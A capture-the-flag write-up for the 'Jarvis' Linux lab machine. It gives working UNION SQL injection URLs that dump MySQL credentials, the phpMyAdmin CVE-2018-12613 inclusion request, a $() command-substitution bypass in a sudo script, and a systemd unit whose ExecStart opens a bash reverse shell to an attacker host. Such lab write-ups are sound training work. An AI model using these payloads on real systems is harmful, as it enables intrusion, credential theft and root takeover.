# Jarvis — Medium — Linux

**Date:** 19 - August - 2026

---

## Tags

`#linux` `#web` `#sqli` `#union-injection` `#phpmyadmin` `#cve-2018-12613` `#command-injection` `#sudo` `#systemctl` `#suid` `#gtfobins` `#privesc`

---

## What I Know

|Item|Detail|
|---|---|
|Target|10.129.229.137 (vhost: supersecurehotel.htb)|
|OS|Debian Linux|
|Open ports|22, 80, 64999|
|Services|OpenSSH 7.4p1 (22); Apache 2.4.25 (80, 64999)|
|Foothold|UNION SQLi in `room.php?cod=` → DBadmin hash → phpMyAdmin 4.8.0 → CVE-2018-12613 RCE|
|User|`www-data` → `pepper` via `sudo simpler.py -p` command-injection (`$()`) → user.txt|
|Privesc|`/bin/systemctl` has SUID bit → malicious `.service` runs as root → root.txt|
|Flags|user.txt as pepper; root.txt as root|

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.229.137
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-20 22:28 +0100
Nmap scan report for supersecurehotel.htb (10.129.229.137)
Host is up (0.053s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
64999/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.24 seconds
```
<img width="842" height="338" alt="image" src="https://github.com/user-attachments/assets/cb9f9462-37cd-4e58-bc7a-283c4520fd46" />

```
nmap -sC -sV -p22,80,64999 10.129.229.137
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-20 22:29 +0100
Nmap scan report for supersecurehotel.htb (10.129.229.137)
Host is up (0.016s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.25
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 88.30 seconds
```

<img width="1206" height="520" alt="image" src="https://github.com/user-attachments/assets/e9c6707d-4e43-46ea-9de8-915608a06ac1" />

**What each port tells me:**

- **Port 22 (SSH)** — OpenSSH 7.4p1 on Debian 9. Open, but no credentials yet, a target to return to once I find some.
- **Ports 80, 64999 (HTTP)** — Apache web apps on two ports. This is the entry point, so I'll focus here first. (64999 initially returns a "banned for 90 seconds" message, a fail2ban-style rate limiter.)

---

## Enumeration Log

```
OBSERVATION: Port 22 is open
WHAT IT TELLS ME: I could SSH in given valid creds
WHAT I AM GOING TO TRY: Set it aside
WHY: No credentials yet
RESULT: N/A
WHAT NEXT:
- Investigate the apps on 80 and 64999
- Dir-fuzz for hidden directories
- Identify the tech stack
```

```
OBSERVATION:
- Port 80 is a "Stark Hotel" booking site with 4 navigable pages (/room.php?cod=1,
  /dining-bar.php, /index.php, /rooms-suites.php)
- Dir-fuzz on port 80 found /phpmyadmin/
- Port 64999 shows "Hey you have been banned for 90 seconds, don't be bad" (rate limiter)
- Nothing else notable in the stack
WHAT IT TELLS ME:
- /room.php?cod=1 is the interesting vector as changing cod pulls different rooms, so it's a
  candidate for SQLi (and worth testing for LFI/RFI given PHP)
- Investigate /phpmyadmin
WHAT I AM GOING TO TRY:
- Throw injections at the cod parameter
- Examine /phpmyadmin
WHY:
- Unvalidated cod could be SQLi/LFI/RFI; phpMyAdmin may be a login/RCE surface
RESULT:
- /phpmyadmin is a default phpMyAdmin login; admin:admin fails, so I need creds
- /phpmyadmin/README discloses phpMyAdmin 4.8.0. searchsploit shows an authenticated RCE
  around 4.8.x (CVE-2018-12613) but I need valid creds to use it
- LFI fuzzing on cod: no vulnerable responses
- SQLi on cod: a single quote (') makes the room details (image, cost, title) disappear meaning
  the query breaks, so it IS injectable. It's a data-retrieval query, so the goal is to dump
  credentials for SSH or phpMyAdmin. Steps:
  1. '' still breaks it → the query expects a NUMBER and isn't quote-wrapped, so I inject
     WITHOUT quotes
  2. UNION approach → find column count via ORDER BY → 7 columns
  3. Enumerated databases: hotel, information_schema, mysql, performance_schema
  4. hotel/mysql are the interesting ones (others are default)
  5. hotel only has room columns (cod,name,price,descrip,star,image,mini), no creds
  6. mysql.user is the promising table
  7. It exposes User and Password columns
  8. Retrieved the hash for DBadmin and cracked it with john → plaintext password
- Logged into phpMyAdmin as DBadmin and ran CVE-2018-12613 to get RCE → shell as www-data
- Can't read user.txt (owned by pepper)
WHAT NEXT:
- Find a way to move laterally to pepper
```

<img width="2541" height="913" alt="image" src="https://github.com/user-attachments/assets/ae0b6302-cd27-49fb-aab4-dd3d55aa6d6f" />

<img width="1616" height="393" alt="image" src="https://github.com/user-attachments/assets/3c3d4b34-9a94-4fc1-91c8-357847392e18" />

<img width="1485" height="269" alt="image" src="https://github.com/user-attachments/assets/2d3fdc1e-d1dd-4aee-8f16-ce64e90356c9" />

<img width="1875" height="698" alt="image" src="https://github.com/user-attachments/assets/bcaf8e99-2d58-4c03-902a-8a30cfbfe925" />

<img width="1018" height="353" alt="image" src="https://github.com/user-attachments/assets/0277f78b-f539-4505-aef6-b277d426bd91" />

<img width="2527" height="202" alt="image" src="https://github.com/user-attachments/assets/2a16d924-0f58-4271-8a75-08d9618f9163" />

<img width="1340" height="700" alt="image" src="https://github.com/user-attachments/assets/8d9cf3ba-8dca-4fcb-8c87-81064ebbfafb" />

<img width="2094" height="1051" alt="image" src="https://github.com/user-attachments/assets/a4d9991d-8185-4bc8-9878-6029caa6626c" />

<img width="2100" height="1050" alt="image" src="https://github.com/user-attachments/assets/3f81ecba-02ed-42a9-8cda-e31ab3abfaaf" />

<img width="2090" height="935" alt="image" src="https://github.com/user-attachments/assets/7df40106-31f8-4bcd-b4ce-c3bd047f4b47" />

<img width="2093" height="932" alt="image" src="https://github.com/user-attachments/assets/b4efcf7c-1055-4219-aebd-a76e20e6c6fd" />

<img width="2103" height="898" alt="image" src="https://github.com/user-attachments/assets/40961863-ac07-466a-9137-36884bc301e0" />

<img width="2101" height="612" alt="image" src="https://github.com/user-attachments/assets/9da0e73b-66a6-41c0-b985-b144c6d607ad" />

<img width="2091" height="930" alt="image" src="https://github.com/user-attachments/assets/2f5d4eee-ec4b-48a9-b46a-c44dea800318" />

<img width="1195" height="453" alt="image" src="https://github.com/user-attachments/assets/1ddeac8e-fe3e-4770-bb01-d9a26ab50674" />

<img width="1952" height="934" alt="image" src="https://github.com/user-attachments/assets/74a4b2cb-2d96-4cfc-830e-6da5d34d47e4" />

<img width="1104" height="651" alt="image" src="https://github.com/user-attachments/assets/369fb05b-bded-403f-b0c9-43eb39e191c2" />

```
OBSERVATION:
- sudo -l shows www-data: may run /var/www/Admin-Utilities/simpler.py as pepper without a
  password
WHAT IT TELLS ME:
- If I can influence what the script executes, I get code execution as pepper
WHAT I AM GOING TO TRY:
- Read simpler.py; check if it's writable, else find a logic flaw to abuse
WHY:
- World-writable would be the easy win; otherwise, a flaw in its handling of input lets me
  break out
RESULT:
- The script is root-owned (not writable), so I read and analysed it. It offers 4 options
  (-h, -a, -l, -p)
- -p runs a ping, but first passes input through a sanitiser that blocks shell breakouts.
  However it does NOT block $ or (), so command substitution $(...) survives the filter and
  executes OS commands as pepper
- Built shell.sh (reverse shell to my box), invoked it via $(...) in the ping prompt, and
  caught a shell as pepper → read user.txt
WHAT NEXT:
- Enumerate for a path to root
```

<img width="1229" height="854" alt="image" src="https://github.com/user-attachments/assets/e9357d22-d0c9-4cc2-956e-e228dff8d22d" />

<img width="725" height="743" alt="image" src="https://github.com/user-attachments/assets/87b8c98b-3cc7-453f-bb97-7221761deb6c" />

<img width="1084" height="1056" alt="image" src="https://github.com/user-attachments/assets/a730c996-de66-4e25-b979-3e5449ae36a6" />

<img width="1251" height="553" alt="image" src="https://github.com/user-attachments/assets/7f4e52b3-f1b0-4d7a-a2e3-cfa6ac44d238" />

<img width="908" height="625" alt="image" src="https://github.com/user-attachments/assets/56475c37-75f1-45b6-b3ec-acaab5351762" />

```
OBSERVATION:
- linpeas as pepper flags /bin/systemctl with the SUID bit (RED/YELLOW: ~95% a PE vector).
  It's owned root:pepper, so pepper can execute it as root
WHAT IT TELLS ME:
- Abuse the systemctl SUID via GTFOBins: write a malicious .service unit and start it as root
WHAT I AM GOING TO TRY:
- Create a .service with ExecStart pointing at my payload, then enable/start it with systemctl
WHY:
- Because systemctl runs as root here, the service's ExecStart executes as root
RESULT:
- Wrote a service that runs a root reverse shell / copies a root SUID; systemctl started it
  and I got root → read root.txt
```

<img width="1943" height="454" alt="image" src="https://github.com/user-attachments/assets/cc82e652-accf-403d-aedc-ca1c834ccf1e" />

<img width="1402" height="749" alt="image" src="https://github.com/user-attachments/assets/593de98d-1e52-4b3f-92b9-efe0c012cc52" />

<img width="998" height="419" alt="image" src="https://github.com/user-attachments/assets/7cddc708-9bd2-4992-bd68-4f3d4c25b5c3" />

<img width="1356" height="636" alt="image" src="https://github.com/user-attachments/assets/350e0110-3ea6-4151-bc10-7d7593a28f17" />

<img width="1033" height="491" alt="image" src="https://github.com/user-attachments/assets/1b45e3c5-7fc9-4a72-a099-53546392ff6b" />

---

## Foothold

**How I got in:** `room.php?cod=` was vulnerable to **SQL injection**. The parameter is a numeric, unquoted value, so I injected without quotes. A **UNION** injection (7 columns) let me enumerate databases and dump `mysql.user`, recovering **DBadmin**'s password hash, which I cracked with john. `/phpmyadmin/README` revealed **phpMyAdmin 4.8.0**, so I logged in as DBadmin and exploited **CVE-2018-12613**, a file-inclusion-to-RCE where a crafted query is written to the PHP session file and then included via the `target` parameter, landing a shell as **www-data**.

**Command / exploit used:**

```
# SQLi (unquoted numeric): find columns, then dump creds
http://10.129.229.137/room.php?cod=1 ORDER BY 7                       # 7 cols
http://10.129.229.137/room.php?cod=0 UNION SELECT 1,2,3,4,5,6,7
http://10.129.229.137/room.php?cod=0 UNION SELECT 1,User,Password,4,5,6,7 FROM mysql.user
# → DBadmin : <hash> ; crack with john → plaintext

# CVE-2018-12613: log into phpMyAdmin as DBadmin, run a query to seed the session, then:
http://10.129.229.137/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_<PHPSESSID>
# → RCE as www-data (reverse shell)
```

**Why it worked:** The room lookup concatenated the `cod` value straight into a numeric SQL query with no validation, so UNION injection turned a read query into a database-wide dump, including the MySQL user table. phpMyAdmin 4.8.0's CVE-2018-12613 then chained cleanly: once authenticated (with the cracked DBadmin creds), an attacker can run a query whose text is stored in the server-side PHP session file and abuse the `target` include to execute that session file as PHP, converting DB access into OS command execution.

---

## Privilege Escalation

**Path taken (www-data → pepper → root):**

_Stage 1 (user.txt):_ `sudo -l` showed www-data may run `/var/www/Admin-Utilities/simpler.py` as **pepper** without a password. The script's `-p` (ping) option sanitises input but fails to block `$` and `()`, so I injected a **command substitution** `$(...)` calling a reverse-shell script, executing as **pepper** and reading user.txt.

_Stage 2 (root.txt):_ As pepper, linpeas flagged **`/bin/systemctl`** with the **SUID** bit (owned root:pepper). Using the GTFOBins systemctl technique, I wrote a malicious systemd `.service` unit with an `ExecStart` payload and started it with systemctl, which, running as root, executed my payload as **root** for root.txt.

**Command / exploit used:**

```
# stage 1: command-substitution bypass in simpler.py -p
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
# at the IP prompt: $(/tmp/shell.sh)   where shell.sh = bash reverse shell
# → shell as pepper → user.txt

# stage 2: systemctl SUID → root service
cat > /tmp/root.service <<'EOF'
[Unit]
Description=root
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
[Install]
WantedBy=multi-user.target
EOF
/bin/systemctl link /tmp/root.service
/bin/systemctl enable --now /tmp/root.service   # → root shell → root.txt
```

**Why it worked:** Two chained misconfigurations. First, `simpler.py`'s ping feature used a **blocklist** sanitiser that forgot `$()`, and blocklists are fragile, one missed metacharacter (command substitution) reopens full command execution, here as the more-privileged pepper via the passwordless sudo entry. Second, `/bin/systemctl` should never be SUID: because it ran as root, pepper could define a systemd service whose `ExecStart` runs anything, and starting it executed that payload with root privileges, the canonical GTFOBins systemctl escalation.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Used a UNION SQL injection in `room.php?cod=` to dump and crack DBadmin's hash, logged into phpMyAdmin 4.8.0, and exploited CVE-2018-12613 for RCE as www-data.
2. **Privesc technique in one sentence:** Bypassed `simpler.py`'s ping filter with `$()` command substitution to reach pepper (passwordless sudo), then abused the SUID `/bin/systemctl` to run a root systemd service.
